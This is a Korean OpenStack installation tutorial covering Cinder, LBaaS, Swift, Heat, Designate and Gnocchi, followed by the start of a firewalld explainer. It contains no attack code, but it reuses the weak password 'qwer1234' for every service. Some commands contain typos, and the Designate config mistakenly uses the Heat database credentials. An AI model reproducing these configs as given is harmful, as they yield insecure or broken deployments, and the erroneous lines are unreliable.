user_domain_name = default project_name = service username = cinder password = qwer1234 [database] connection = mysql+pymysql://cinder:qwer1234@controller/cinder [oslo_concurrency] lock_path = $state_path/tmp # cinder.conf 파일을 수정합니다. $ su -s /bin/bash cinder -c \u0026#34;cinder-manage db sync\u0026#34; # cinder db를 동기화시킵니다. $ systemctl start openstack-cinder-api openstack-cinder-scheduler $ systemctl enable openstack-cinder-api openstack-cinder-scheduler # cinder 시작 및 자동시작을 등록합니다. $ echo \u0026#34;export OS_VOLUME_API_VERSION=3\u0026#34; \u0026gt;\u0026gt; ~/admin $ source ~/admin # 볼륨 버전을 API 3로 지정합니다. $ firewall-cmd --add-port=8776/tcp --permanent $ firewall-cmd --reload     이어서 compute 노드에 설치를 진행하겠습니다. cinder 패키지 설치 및 수정  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-cinder python2-crypto targetcli $ vi /etc/cinder/cinder.conf [DEFAULT] my_ip = 10.10.10.30 log_dir = /var/log/cinder state_path = /var/lib/cinder auth_strategy = keystone transport_url = rabbit://openstack:qwer1234@controller glance_api_servers = http://controller:9292 enable_v3_api = True [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = cinder password = qwer1234 [database] connection = mysql+pymysql://cinder:qwer1234@controller/cinder [oslo_concurrency] lock_path = $state_path/tmp # cinder.conf 파일을 수정합니다. $ systemctl start openstack-cinder-volume $ systemctl enable openstack-cinder-volume # cinder 서비스를 시작 및 자동시작을 등록합니다. $ controller $openstack volume service list # 확인 +------------------+------------+------+---------+-------+----------------------------+ | Binary | Host | Zone | Status | State | Updated At | +------------------+------------+------+---------+-------+----------------------------+ | cinder-scheduler | controller | nova | enabled | up | 2020-07-20T04:02:31.000000 | +------------------+------------+------+---------+-------+----------------------------+    8-2. LVM으로 블록 스토리지 백엔드 구성   compute 노드에 cinder 서비스를 설치한 것에 이어 LVM 백엔드를 설정해보도록 하겠습니다. VG 생성 참조  $ fdisk /dev/sd[ n ] # 만약 디스크 파티션이 없으시면 새로 생성 후 등록합니다. # 저는 간단하게 100G 하드를 추가한 후, cinder 이름으로 vg를 생성하였습니다. $ vi /etc/cinder/cinder.conf [DEFAULT] ... enabled_backends = lvm [lvm] target_helper = lioadm target_protocol = iscsi target_ip_address = 10.10.10.30 volume_group = cinder volume_driver = cinder.volume.drivers.lvm.LVMVolumeDriver volume_dir = $state_path/volumes # cinder.conf의 상단에 내용을 추가설정합니다. $ firewall-cmd --add-service=iscsi-target --permanent $ firewall-cmd --reload # 방화벽 설정을 추가합니다. $ systemctl restart openstack-cinder-volume # 서비스를 재시작합니다.   이어서 compute 노드의 nova.conf 파일을 수정합니다.  $ vi /etc/nova/nova.conf [cinder] os_region_name = RegionOne # nova.conf의 하단에 상단의 내용을 추가합니다. $ systemctl restart openstack-nova-compute # nova 서비스를 재시작합니다. $ controller $ openstack volume service list # 생성을 확인합니다. +------------------+-------------+------+---------+-------+----------------------------+ | Binary | Host | Zone | Status | State | Updated At | +------------------+-------------+------+---------+-------+----------------------------+ | cinder-scheduler | controller | nova | enabled | up | 2020-07-20T04:54:52.000000 | | cinder-volume | compute@lvm | nova | enabled | up | 2020-07-20T04:54:52.000000 | +------------------+-------------+------+---------+-------+----------------------------+ $ controller $ openstack volume cretae --size 1 test # 확인용 1G volume을 생성합니다. +---------------------+--------------------------------------+ | Field | Value | +---------------------+--------------------------------------+ | attachments | [] | | availability_zone | nova | | bootable | false | | consistencygroup_id | None | | created_at | 2020-07-20T05:00:21.000000 | | description | None | | encrypted | False | | id | f09ee80f-3ec8-4eaf-a4a5-af13cccbd5ae | | migration_status | None | | multiattach | False | | name | test | | properties | | | replication_status | None | | size | 1 | | snapshot_id | None | | source_volid | None | | status | creating | | type | None | | updated_at | None | | user_id | 296ce49d1dc94931b62a726fb64712e9 | +---------------------+--------------------------------------+ $ openstack volume list # 생성한 volume을 확인합니다. +--------------------------------------+------+-----------+------+-------------+ | ID | Name | Status | Size | Attached to | +--------------------------------------+------+-----------+------+-------------+ | f09ee80f-3ec8-4eaf-a4a5-af13cccbd5ae | test | available | 1 | | +--------------------------------------+------+-----------+------+-------------+    8-3. LBaaS 설치  로드밸런싱을 위해서는 LBaaS를 사용해야 합니다. LBaaS에 대해서는 LBaaS를 참조해주세요.  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-neutron-lbaas net-tools # LBaaS 서비스를 설치합니다. $ vi /etc/neutron/neutron.conf service_plugins = router,lbaasv2 # lbaasv2 서비스를 추가합니다. $ vi /etc/neutron/neutron_lbaas.conf [service_providers] service_provider = LOADBALANCERV2:Haproxy:neutron_lbaas.drivers.haproxy.plugin_driver.HaproxyOnHostPluginDriver:default $ vi /etc/neutron/lbaas_agent.ini [DEFAULT] interface_driver = openvswitch $ su -s /bin/bash neutron -c \u0026#34;neutron-db-manage --subproject neutron-lbaas --config-file /etc/neutron/neutron.conf --config-file /etc/neutron/plugin.ini upgrade head\u0026#34; $ systemctl restart neutron-server   network 노드와 compute 노드는 동일하게 진행합니다.  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-neutron-lbaas haproxy net-tools $ vi /etc/neutron/neutron.conf service_plugins = router,lbaasv2 $ vi /etc/neutron/neutron_lbaas.conf [service_providers] service_provider = LOADBALANCERV2:Haproxy:neutron_lbaas.drivers.haproxy.plugin_driver.HaproxyOnHostPluginDriver:default $ vi /etc/neutron/lbaas_agent.ini [DEFAULT] interface_driver = openvswitch $ systemctl start neutron-lbaasv2-agent $ systemctl enable neutron-lbaasv2-agent    8-4. LFS, LVM 기반 다중 스토리지 노드 구성    9. Swift ( 오브젝트 스토리지 서비스 ) 구성   Swift란 오브젝트 스토리지 서비스로, 흔히 우리가 생각하는 네이버 클라우드와 거의 동일한 맥락이라 할 수 있습니다. swift는 기본적으로 controller에 설치하나 여기서는 비교적 자원소모가 적은 network 노드에 proxy-sever를, compute 노드를 storage로 사용하여 설치하여 진행하겠습니다. swift에 대한 설명은 swift을 참조해주세요.**    swift 서비스 생성 controlloer 노드에는 swift 관련 패키지를 설치하지는 않지만 서비스의 관리를 위해 유저, 엔드포인트, url을 생성합니다.  $ openstack user create --domain default --project service --password qwer1234 swift $ openstack role add --project service --user swift admin $ openstack service create --name swift --description \u0026#34;OpenStack Object Storage\u0026#34; object-store # swfit 유저를 생성하고 관리자의 권한을 부여합니다. $ export swift_proxy=10.10.10.20 $ openstack endpoint create --region RegionOne object-store public http://$swift_proxy:8080/v1/AUTH_%\\(tenant_id\\)s $ openstack endpoint create --region RegionOne object-store internal http://$swift_proxy:8080/v1/AUTH_%\\(tenant_id\\)s $ openstack endpoint create --region RegionOne object-store admin http://$swift_proxy:8080/v1/AUTH_%\\(tenant_id\\)s # swift의 endpoint를 등록합니다. 여기서 proxy 서버는 네트워크 노드를 등록합니다.     이어서 network 노드에서의 swift 설치 및 설정을 진행하겠습니다.  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-swift-proxy python-memcached openssh-clients # swift 서비스에 필요한 패키지를 설치합니다. $ vi /etc/swift/proxy-server.conf [filter:cache] use = egg:swift#memcache #memcache_servers = 127.0.0.1:11211 memcache_servers = controller:11211 [filter:authtoken] paste.filter_factory = keystonemiddleware.auth_token:filter_factory #admin_tenant_name = %SERVICE_TENANT_NAME% #admin_user = %SERVICE_USER% #admin_password = %SERVICE_PASSWORD% #admin_host = 127.0.0.1 #admin_port = 35357 #admin_protocol = http #admin_ /tmp/keystone-signing-swift # paste.filter_factory를 제외한 기존 정보는 주석처리 www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = swift password = qwer1234 delay_auth_decision = true # 위에 내용을 대신 주석 추가 # proxy-server.conf 파일을 수정합니다. # memcache_servers의 IP는 controller 노드의 IP로 수정합니다. $ vi /etc/swift/swift.conf [swift-hash] #swift_hash_path_suffix = %SWIFT_HASH_PATH_SUFFIX% swift_hash_path_suffix = swift_shared_path swift_hash_path_prefix = swift_shared_path   swift 서비스의 사용을 위해 account, container, object를 생성합니다.  $ swift-ring-builder /etc/swift/account.builder create 12 1 1 $ swift-ring-builder /etc/swift/container.builder create 12 1 1 $ swift-ring-builder /etc/swift/object.builder create 12 1 1 # account, container, object를 생성합니다. # 12 = 한 클러스터 스토리지에서 생성 가능한 파티션의 수 # 1 = 오브젝트 복수 수 ( 스토리지의 개수 ) # 1 = 데이터 이동, 복제, 파티션 이동 등이 진행될 때 잠기는 최소 시간, 데이터 손실을 방지하기 위한 기능 $ swift-ring-builder /etc/swift/account.builder add r0z0-10.10.10.30:6202/device0 100 $ swift-ring-builder /etc/swift/container.builder add r0z0-10.10.10.30:6201/device0 100 $ swift-ring-builder /etc/swift/object.builder add r0z0-10.10.10.30:6200/device0 100 $ swift-ring-builder /etc/swift/account.builder rebalance $ swift-ring-builder /etc/swift/container.builder rebalance $ swift-ring-builder /etc/swift/object.builder rebalance # compute 노드의 builder에 region과 zone을 추가 후 반영시킵니다. # r = region, z = zone $ chown swift. /etc/swift/*.gz # swift 관련 파일의 소유권을 변경합니다. $ systemctl start openstack-swift-proxy $ systemctl enable openstack-swift-proxy # 프록시 서비스를 시작합니다. $ firewall-cmd --add-port=8080/tcp --permanent $ firewall-cmd --reload # 방화벽을 사용 중이라면 방화벽을 등록합니다.     이제 이어 storage를 구성하기 위해 compute 노드에서의 설치를 진행해보도록 하겠습니다. compute 노드는 이미 cinder 서비스가 동작하고 있어 기본적인 네트워크, 시간 설정, 레포지터리 지정 등은 구성이 마친 상태의 노드입니다. 만약 다른 노드에 구성하시거나 swift 서비스를 다중 노드로 구성하시는 경우 위와 같은 설정을 먼저 진행해주시길 바랍니다. 여기서는 swift 서비스를 위해 100G의 버츄얼 디스크( dev/sdc )를 추가하여 진행하였습니다.  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-swift-account openstack-swift-container openstack-swift-object xfsprogs rsync openssh-clients # swift 서비스를 설치합니다. $ scp root@network:/etc/swift/*.gz /etc/swift/ $ chown swift. /etc/swift/*.gz # network 노드에서의 설정파일을 복사옵니다. $ vi /etc/swift/swift.conf [swift-hash] #swift_hash_path_suffix = %SWIFT_HASH_PATH_SUFFIX% swift_hash_path_suffix = swift_shared_path swift_hash_path_prefix = swift_shared_path $ swift.conf 파일을 설정합니다. $ vi /etc/swift/account-server.conf bind-ip = 0.0.0.0 bind_port = 6202 $ vi /etc/swift/container-server.conf bind-ip = 0.0.0.0 bind_port = 6201 $ vi /etc/swift/object-server.conf bind-ip = 0.0.0.0 bind_port = 6200 $ vi /etc/rsyncd.conf pid file = /var/run/rsymcd.pid log file = /var/log/rsymcd.log uid = swift gid = swift address = compute [account] path = /srv/node read only = false write only = no list = yes incoming chmod = 0644 outgoing chmod = 0644 max connections = 25 lock file = /var/lock/account.lock [container] path = /srv/node read only = false write only = no list = yes incoming chmod = 0644 outgoing chmod = 0644 max connections = 25 lock file = /var/lock/container.lock [object] path = /srv/node read only = false write only = no list = yes incoming chmod = 0644 outgoing chmod = 0644 max connections = 25 lock file = /var/lock/object.lock [swift_server] path = /etc/swift read only = true write only = no list = yes incoming chmod = 0644 outgoing chmod = 0644 max connections = 5 lock file = /var/lock/swift_server.lock # swift 서비스관련 파일을 수정합니다.   compute 노드에서 disk 설정을 진행합니다.  $ mkfs.xfs -i size=1024 -s size=4096 /dev/sdb1 meta-data=/dev/sdc1 isize=1024 agcount=4, agsize=6553536 blks = sectsz=4096 attr=2, projid32bit=1 = crc=1 finobt=0, sparse=0 data = bsize=4096 blocks=26214144, imaxpct=25 = sunit=0 swidth=0 blks naming =version 2 bsize=4096 ascii-ci=0 ftype=1 log =internal log bsize=4096 blocks=12799, version=2 = sectsz=4096 sunit=1 blks, lazy-count=1 realtime =none extsz=4096 blocks=0, rtextents=0 # 디스크의 xfs의 유형으로 포맷시킵니다. $ mkdir -p /srv/node/device0 $ mount -o noatime,nodiratime,nobarrier /dev/sdc1 /srv/node/device0 $ chown -R swift. /srv/node # device0 디렉토리를 생성하고 해당 디렉토리에 sdb1 볼륨을 마운트시킨 후, swift로 소유권을 변경시킵니다. $ vi /etc/fstab /dev/sdc1 /srv/node/device0 xfs noatime,nodiratime,nobarrier 0 0 # 재부팅할 경우를 대비하여 생성한 볼륨을 fstab에 등록합니다.     selinux 및 방화벽 관련 서비스를 설정합니다.  $ semanage fcontext -a -t swift_data_t /srv/node/device0 $ restorecon /srv/node/device0 $ firewall-cmd --add-port={873/tcp,6200/tcp,6201/tcp,6202/tcp} --permanent $ firewall-cmd --reload   swift 관련 서비스를 재시작합니다.  $ systemctl restart rsyncd openstack-swift-account-auditor openstack-swift-account-replicator openstack-swift-account openstack-swift-container-auditor openstack-swift-container-replicator openstack-swift-container-updater openstack-swift-container openstack-swift-object-auditor openstack-swift-object-replicator openstack-swift-object-updater openstack-swift-object $ systemctl enable rsyncd openstack-swift-account-auditor openstack-swift-account-replicator openstack-swift-account openstack-swift-container-auditor openstack-swift-container-replicator openstack-swift-container-updater openstack-swift-container openstack-swift-object-auditor openstack-swift-object-replicator openstack-swift-object-updater openstack-swift-object   확인을 위해 controller 노드에 httpd를 재시작합니다.  $ systemctl restart httpd # 대시보드 접속 후 프로젝트에서 오브젝트 스토리지가 메뉴에 있는 지를 확인합니다. $ openstack container create test +---------------------------------------+-----------+------------------------------------+ | account | container | x-trans-id | +---------------------------------------+-----------+------------------------------------+ | AUTH_2ac06290d2d943d5a768fe3daa53b118 | test | tx22f3dd125f134a189602c-005f24cef1 | +---------------------------------------+-----------+------------------------------------+ $ echo Hello \u0026gt; test.txt $ swift upload test test.txt $ swift list test $ swift list test test.txt    10. Heat ( Orchestration ) 설치   클라우딩 컴퓨팅이 꽃인 Orchestaration 기능을 수행하는 Heat 서비스를 설치해보도록 하겠습니다. Heat 설치는 controller, network 노드 순으로 우리어집니다. Heat*에 대한 설명은 Heat을 참조해주세요.    Heat 서비스 생성  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-heat-common python-heatclient # heat 서비스 관련 패키지를 다운로드 합니다. $ openstack user create --domain default --project service --password qwer1234 heat $ openstack role add --project service --user heat admin $ openstack role create heat_stack_owner $ openstack role create heat_stack_user $ openstack role add --project admin --user admin heat_stack_owner $ openstack service create --name heat --description \u0026#34;Openstack Orchestration\u0026#34; orchestration $ openstack service create --name heat-cfn --description \u0026#34;Openstack Orchestration\u0026#34; cloudformation # heat 유저를 생성하고 관리자의 권한을 부여합니다. $ export heat_api=10.10.10.20 $ openstack endpoint create --region RegionOne orchestration public http://$heat_api:8004/v1/AUTH_%\\(tenant_id\\)s $ openstack endpoint create --region RegionOne orchestration internal http://$heat_api:8004/v1/AUTH_%\\(tenant_id\\)s $ openstack endpoint create --region RegionOne orchestration admin http://$heat_api:8004/v1/AUTH_%\\(tenant_id\\)s $ openstack endpoint create --region RegionOne cloudformation public http://$heat_api:8000/v1 $ openstack endpoint create --region RegionOne cloudformation internal http://$heat_api:8000/v1 $ openstack endpoint create --region RegionOne cloudformation admin http://$heat_api:8000/v1 # heat 서비스의 endpoint를 등록합니다. 여기서 proxy 서버는 네트워크 노드를 등록합니다. $ openstack domain create --description \u0026#34;Stack projects and users\u0026#34; heat $ openstack user create --domain heat --password qwer1234 heat_domain_admin $ openstack role add --domain heat --user heat_domain_admin admin # heat domain을 생성하고 heat 유저에게 권한을 부여합니다.   heat의 DB를 생성합니다.  $ mysql -u root -p MariaDB [(none)]\u0026gt; create database heat; MariaDB [(none)]\u0026gt; grant all privileges on heat.* to heat@\u0026#39;localhost\u0026#39; identified by \u0026#39;pw\u0026#39;; MariaDB [(none)]\u0026gt; grant all privileges on heat.* to keystone@\u0026#39;%\u0026#39; identified by \u0026#39;pw\u0026#39;; MariaDB [(none)]\u0026gt; flush privileges; # heat DB를 생성합니다. 여기서 pw는 qwer1234으로 모두 통일하였습니다.   이어서 network 노드에서 heat 서비스를 설치해보겠습니다.  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-heat-api openstack-heat-api-cfn openstack-heat-engine python-heatclient # heat 서비스를 위한 패키지를 설치합니다. $ vi /etc/heat/heat.conf [DEFAULT] deferred_auth_method = trusts trusts_delegated_roles = heat_stack_owner # Heat installed server heat_metadata_server_url = http://network:8000 heat_waitcondition_server_url = http://network:8000/v1/waitcondition heat_watch_server_url = http://network:8003 heat_stack_user_role = heat_stack_user # Heat domain name stack_user_domain_name = heat # Heat domain admin name stack_domain_admin = heat_domain_admin # Heat domain admin\u0026#39;s password stack_domain_admin_password = qwer1234 # RabbitMQ connection info transport_url = rabbit://openstack:qwer1234@controller # MariaDB connection info [database] connection = mysql+pymysql://heat:qwer1234@controller/heat # Keystone auth info [clients_keystone] auth_uri = http://controller:5000 # Keystone auth info [ec2authtoken] auth_uri = http://controller:5000 [heat_api] bind_host = 0.0.0.0 bind_port = 8004 [heat_api_cfn] bind_host = 0.0.0.0 bind_port = 8000 # Keystone auth info [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = heat password = qwer1234 [trustee] auth_plugin = password auth_url = http://controller:5000 username = heat password = qwer1234 user_domain_name = default # heat.conf 파일을 수정합니다. $ su -s /bin/bash heat -c \u0026#34;heat-manage db_sync\u0026#34; $ systemctl start openstack-heat-api openstack-heat-api-cfn openstack-heat-engine $ systemctl enable openstack-heat-api openstack-heat-api-cfn openstack-heat-engine # DB의 데이터를 삽입하고, 서비스슬 등록합니다.   방화벽을 사용중이면 방화벽을 설정합니다.  $ firewall-cmd --add-port={8000/tcp,8004/tcp} --permanent $ firewall-cmd --reload    $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-designate-api openstack-designate-central openstack-designate-worker openstack-designate-producer openstack-designate-mdns python-designateclient bind bind-utils # 서비스 관련 패키지를 설치합니다. $ rndc-confgen -a -k designate -c /etc/designate.key -r /dev/urandom $ chown named:designate /etc/designate.key $ chmod 640 /etc/designate.key # key를 생성합니다. $ vi /etc/named.conf # create new options { listen-on port 53 { any; }; listen-on-v6 port 53 { none; }; directory \u0026#34;/var/named\u0026#34;; dump-file \u0026#34;/var/named/data/cache_dump.db\u0026#34;; statistics-file \u0026#34;/var/named/data/named_stats.txt\u0026#34;; memstatistics-file \u0026#34;/var/named/data/named_mem_stats.txt\u0026#34;; # replace query range to your own environment allow-query { localhost; 10.10.10.0/24; }; allow-new-zones yes; request-ixfr no; recursion no; bindkeys-file \u0026#34;/etc/named.iscdlv.key\u0026#34;; managed-keys-directory \u0026#34;/var/named/dynamic\u0026#34;; pid-file \u0026#34;/run/named/named.pid\u0026#34;; session-keyfile \u0026#34;/run/named/session.key\u0026#34;; }; include \u0026#34;/etc/designate.key\u0026#34;; controls { inet 0.0.0.0 port 953 allow { localhost; } keys { \u0026#34;designate\u0026#34;; }; }; logging { channel default_debug { file \u0026#34;data/named.run\u0026#34;; severity dynamic; }; }; zone \u0026#34;.\u0026#34; IN { type hint; file \u0026#34;named.ca\u0026#34;; }; $ chown -R named. /var/named $ systemctl start named $ systemctl enable naemd $ vi /etc/designate/designate.conf [DEFAULT] log_dir = /var/log/designate transport_url = rabbit://openstack:qwer1234@controller root_helper = sudo designate-rootwrap /etc/designate/rootwrap.conf [database] connection = mysql+pymysql://heat:qwer1234@controller/heat [service:api] listen = 0.0.0.0:9001 auth_strategy = keystone api_base_uri = http://controller:9001 enable_api_v2 = True enabled_extensions_v2 = quotas, reports [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = heat password = qwer1234 [service:worker] enabled = True notify = True [storage:sqlalchemy] connection = mysql+pymysql://heat:qwer1234@controller/heat $ su -s /bin/sh -c \u0026#34;designate-manage database sync\u0026#34; designate $ systemctl start designate-central designate-api $ systemctl enable designate-central designate-api $ vi /etc/designate/pools.yaml # create new (replace hostname and IP address to your own environment) - name: default description: Default Pool attributes: {} ns_records: - hostname: network.srv.world. priority: 1 nameservers: - host: 10.10.10.20 port: 53 targets: - type: bind9 description: BIND9 Server masters: - host: 10.10.10.20 port: 5354 options: host: 10.10.10.20 port: 53 rndc_host: 10.10.10.20 rndc_port: 953 rndc_key_file: /etc/designate.key $ su -s /bin/sh -c \u0026#34;designate-manage pool update\u0026#34; designate Updating Pools Configuration $ systemctl start designate-worker designate-producer designate-mdns $ systemctl enable designate-worker designate-producer designate-mdns   이어서 selinux와 방화벽을 설정합니다.  $ setsebool -P named_write_master_zones on $ firewall-cmd --add-service=dns --permanent $ firewall-cmd --add-port={5354/tcp,9001/tcp} --permanent $ firewall-cmd --reload controller\u0026gt; $openstack dns service list # 확인      11. Openstack 대시보드 메인 로고 및 링크 변경    12. Neutron 기반 Service Functon Chaining ( SFC ) 기능 구성   #\n"}),a.add({id:220,href:'/docs/openstack/openstacktraining/openstack-ussuri-11/',title:"OpenStack Ussuri : Gnocch",content:"OpenStack Ussuri : Gnocch  ----------------------- ----------------------- ----------------------- | [ Controller Node ] | | [ Compute Node ] | | [ Network Node ] | | | | Libvirt | | Open vSwitch | | MariaDB RabbitMQ | | Nova compute | | L2 Agent | | Memcached Keystone | | Open vSwitch | | L3 Agent | | httpd Cinder API | | L2 Agent | | metadata agent | | Nova-API Compute | | Cinder-LVM | | Swift-proxy | | L2 agent L3 agent | | NFS | | Heat API | | metadata agent | ----------------------- | API-CFN | | Neutron Server | | Heat Engine | | Gnocchi | ----------------------- ----------------------- --------------------------------- | [ Storage Node 1, 2, 3 ] | | | | Swift-account-auditor | | Swift-account-replicator | | Swift-account | | Swift-container-auditor | | Swift-container-replicator | | Swift-container-updater | | Swift-container | | Swift-object-auditor | | Swift-object-replicator | | Swift-object-updater | | Swift-swift-object | ---------------------------------  OpenStack Ussuri : Gnnoch   Gnnoch     Gnocchi service 및 User 생성 $ controller ~(keystone)\u0026gt; openstack user create --domain default --project service --password qwer1234 gnocchi +---------------------+----------------------------------+ | Field | Value | +---------------------+----------------------------------+ | default_project_id | b470c69e28db47cdbfc81e06cc67f627 | | domain_id | default | | enabled | True | | id | 3217be4917454641994660bd1f3ea007 | | name | gnocchi | | options | {} | | password_expires_at | None | +---------------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack role add --project service --user gnocchi admin $ controller ~(keystone)\u0026gt; openstack service create --name gnocchi --description \u0026#34;Metric Service\u0026#34; metric -------------------------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | Metric Service | | enabled | True | | id | 6ac9ec31386f4291b582bd5b504ac485 | | name | gnocchi | | type | metric | +-------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne metric public http://controller:8041 +--------------+----------------------------------+ | Field | Value | +--------------+----------------------------------+ | enabled | True | | id | 12f4410ed82240b0b1340d48b0627612 | | interface | public | | region | RegionOne | | region_id | RegionOne | | service_id | 6ac9ec31386f4291b582bd5b504ac485 | | service_name | gnocchi | | service_type | metric | | url | http://controller:8041 | +-------------------------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne metric internal http://controller:8041 +--------------+----------------------------------+ | Field | Value | +--------------+----------------------------------+ | enabled | True | | id | 70f43453f93b407e94d2dd11ddce7260 | | interface | internal | | region | RegionOne | | region_id | RegionOne | | service_id | 6ac9ec31386f4291b582bd5b504ac485 | | service_name | gnocchi | | service_type | metric | | url | http://controller:8041 | +--------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne metric admin http://controller:8041 +--------------+----------------------------------+ | Field | Value | +--------------+----------------------------------+ | enabled | True | | id | bb9a955359fd4af18599913465f46958 | | interface | admin | | region | RegionOne | | region_id | RegionOne | | service_id | 6ac9ec31386f4291b582bd5b504ac485 | | service_name | gnocchi | | service_type | metric | | url | http://controller:8041 | +--------------+----------------------------------+  Gnocchi 유저의 DB를 생성합니다.  $ controller\u0026gt; mysql -u root -p $ MariaDB\u0026gt; create database gnocchi; $ MariaDB\u0026gt; grant all privileges on gnocchi.* to gnocchi@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; grant all privileges on gnocchi.* to gnocchi@\u0026#39;%\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; flush privileges; $ MariaDB\u0026gt; exit;    controller node Gnoochi 설치  $ controller\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-gnocchi-api openstack-gnocchi-metricd python3-gnocchiclient # gnoochi 및 관련 모듈을 설치합니다. $ controller\u0026gt; vi /etc/gnocchi/gnocchi.conf [DEFAULT] log_dir = /var/log/gnocchi [api] auth_mode = keystone [database] backend = sqlalchemy [indexer] url = mysql+pymysql://gnocchi:qwer1234@controller/gnocchi [storage] driver = file file_basepath = /var/lib/gnocchi [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = gnocchi password = qwer1234 service_token_roles_required = true $ controller\u0026gt; vi /etc/httpd/conf.d/10-gnocchi_wsgi.conf Listen 8041 \u0026lt;VirtualHost *:8041\u0026gt; \u0026lt;Directory /usr/bin\u0026gt; AllowOverride None Require all granted \u0026lt;/Directory\u0026gt; CustomLog /var/log/httpd/gnocchi_wsgi_access.log combined ErrorLog /var/log/httpd/gnocchi_wsgi_error.log SetEnvIf X-Forwarded-Proto https HTTPS=1 WSGIApplicationGroup %{GLOBAL} WSGIDaemonProcess gnocchi display-name=gnocchi_wsgi user=gnocchi group=gnocchi processes=6 threads=6 WSGIProcessGroup gnocchi WSGIScriptAlias / /usr/bin/gnocchi-api \u0026lt;/VirtualHost\u0026gt; # 새로 생성합니다. $ controller\u0026gt; su -s /bin/bash gnocchi -c \u0026#34;gnocchi-upgrade\u0026#34; $ controller\u0026gt; systemctl enable --now openstack-gnocchi-metricd $ controller\u0026gt; systemctl restart httpd # gnocchi DB를 import 시킨 후 서비스를 등록합니다. $ controller\u0026gt; semanage port -a -t http_port_t -p tcp 8041 $ controller\u0026gt; firewall-cmd --add-port=8041/tcp --permanent $ controller\u0026gt; firewall-cmd --reload # SELinux 및 방화벽을 설정합니다. "}),a.add({id:221,href:'/docs/network/network/firewall/',title:"Firewall",content:"방화벽 (CentOS - firewalld)    리눅스의 방화벽\n 커널의 Netfilter 모듈에 기초를 두고 있는 하나의 프로그램 방화벽은 일반적으로 내부와 외부 네트워크의 경계 지점에 위치 기본적으로 들어오고 나가는 패킷에 대해 지정된 정책과 규칙을 사용 허용(Accept)과 거절(Reject)이라는 행동을 통해 모든 패킷을 통제       방화벽의 종류\n 패킷 필터링 방화벽  - 제 1세대 방화벽\r- 레이어 1~4에서 사용\r- 단순하기 때문에 빠르고 효과적\r- 5~7계층 대응 불가\r Stateful 방화벽  - 제 2세대 방화벽\r- 패킷의 연결 상태를 관찰\r- 메모리에서 상태 테이블 사용 - DoS 공격과 같은 메모리 잠식 공격에 취약\r **애플리케이션 레이어 방화벽 **  - 제 3세대 방화벽\r- 레이어7까지 패킷 검사와 필터링 - 고사양의 장비가 필요\r     방화벽의 구성요소   규칙(Rule) : Netfilter에서 가장 핵심적인 구성 요소로서 하나 또는 그 이상 일치돼야 할 항목들로 구성되며, 패킷이 이러한 규칙이 일치(match)할 경우 타겟을 이용해 구체적인 행동 사항을 지정한다. 들어오는 패킷이 설정된 여러 규칙 중 한가지와 일치할 경우 더 이상의 규칙 검사는 진행되지 않으며 이 규칙에 정의된 target, 즉 구체적인 행동이 적용되면서 이 패킷에 대한 동작을 종료하게 된다.\n  타겟(Target) : 정해진 규칙에 일치된 패킷은 해당 규칙에 지정된 타켓으로 보내진다. 이 타겟은 이렇게 일치된 패킷에 대해 구체적인 행동을 정의한 것인데, 각각 내장 타겟과 확장 타겟을 통해 다양한 종류의 타겟을 사용할 수 있다. 대표적으로 사용되는 내장 타겟으로 패킷을 받아들이는 Accept, 패킷을 거부하는 Drop과 Reject, 패킷에 대한 자세한 정보를 기록하는 Log, 마지막으로 주소 변환에 사용되는 SNAT와 DNAT 등이 있다.\n  체인 (Chain) : Netfilter 구조에서 체인은 정책이 결합된 하나의 그룹이다. 일반적으로 한 개의 체인은 여러 개의 규칙과 한 개의 정책으로 구성된다. 체인으로 들어온 패킷은 각각의 규칙을 순서대로 거치게 되며, 이 중 한 규칙과 일치되면 이 패킷은 그 규칙에 정의된 타겟으로 보내진다. 이로써 그패킷에 대한 체인에서의 모든 과정은 종료된다. 최종적으로 일치되는 규칙이 없는 경우 이 체인에 설정된 정책이 적용된다. 체인과 체인 간에 복잡한 설정이 필요한 경우 Netfilter가 지원하는 매우 뛰어난 기능이며, 가장 대표적인 체인으로 PREROUTING, INPUT, OUTPUT, FORWARD, POSTROUTING이 사용된다.\n  정책(Policy) : Netfilter가 제공하는 모든 체인을 갖고 있는데, 이 정책은 체인에서 각 규칙을 모두 통과한 패킷에 적용된다. 이 정책은 수행하는 마지막 행위로서 최종 타겟이라고도 하는데, 정책의 종류로 DROP, ACCEPT 등이 사용된다.\n  테이블(Table) : 체인은 여러 개의 규칙과 한 개의 정책이 결합된 그룹이라고 설명했는데, 테이블은 여러 체인이 결합된 그룹이다.\n       Firewalld Zone\n  Drop 존\n 들어오는 모든 패킷은 버려지고 이에 대한 응답 메시지도 보내지 않으며 단지 외부로로 나가는 연결만 허용    Block 존\n Drop 존처럼 들어오는 모든 네트워크 연결은 거부되는데, 이에 대해 icmp-host-prohibited와 icmp6-prohibited라는 응답 메시지를 보낸다.    Public 존\n 서비스를 제공하는 